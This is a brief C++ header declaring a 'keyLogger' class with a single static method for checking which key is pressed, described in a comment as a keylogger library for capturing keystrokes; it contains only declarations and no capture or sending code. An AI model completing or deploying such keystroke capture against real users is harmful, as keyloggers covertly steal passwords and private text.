#pragma once
#include <Windows.h>
#include "keyProcessor.h"
#include "keyStroke.h"

#define NUM_OF_KEYS 255

/*
* Keylogger library, containing functions and 
* constants relating directly to capturing keystrokes. 
*/

class keyLogger
{
public:
	static keyStroke checkPressedKey();
};

